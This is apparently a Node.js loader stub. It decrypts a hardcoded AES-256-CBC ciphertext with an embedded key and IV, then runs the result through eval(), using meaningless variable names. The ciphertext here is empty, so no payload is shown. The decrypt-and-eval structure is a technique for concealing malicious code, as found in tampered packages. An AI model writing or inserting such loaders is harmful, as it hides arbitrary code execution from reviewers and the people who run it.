const ito = require('crypto');
const itinho = Buffer.from('1ccc54da138d290c6a9ad38f7dad3d682b1b9c704b70e2e91c8cd465bb03de11', 'hex');
const octua = Buffer.from('ca1eed685245dfdd790a1b30cd0fe45a', 'hex');
const Itinho = '';
const itinhoher = ito.createDecipheriv('aes-256-cbc', itinho, octua);
let ohniticry = itinhoher.update(Itinho, 'hex', 'utf8');
ohniticry += itinhoher.final('utf8');
eval(ohniticry);
